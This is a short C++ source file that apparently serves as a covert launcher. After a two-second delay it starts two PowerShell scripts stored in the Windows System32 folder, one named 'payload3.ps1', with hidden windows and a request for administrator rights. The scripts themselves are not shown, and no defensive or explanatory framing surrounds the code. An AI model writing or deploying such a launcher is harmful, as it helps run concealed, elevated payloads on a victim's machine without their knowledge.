#include <io.h> 
#include <cstdlib>
#include <unistd.h>
int main(){
	sleep(2);
	//for (int i = 0 ; i < 2 ; i++){
	system("start powershell -w hidden C:\\WINDOWS\\System32\\run.ps1 -windowsstyle hidden -verb runas");
	system("start powershell -w hidden C:\\WINDOWS\\System32\\payload3.ps1 -windowsstyle hidden -verb runas"); 
		
}
